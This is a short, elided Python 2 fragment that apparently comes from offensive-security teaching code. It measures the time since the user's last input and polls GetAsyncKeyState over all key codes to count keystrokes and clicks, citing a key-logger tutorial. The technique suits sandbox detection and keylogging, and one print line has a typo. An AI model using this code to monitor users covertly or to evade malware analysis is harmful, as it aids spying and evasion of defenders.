...
def get_last_input():
    ...
    print "[*] It's been %d milliseconds since the last input event." % elapsedk

    return elapsed

# using ctypes rather than PyHook
def get_key_press():
    global mouse_clicks
    global keystrokes

    for i in range(0,0xff):
        if user32.GetAsyncKeyState(i) == -32767:    # https://nickthecoder.wordpress.com/2012/09/06/key-logger-part-1/
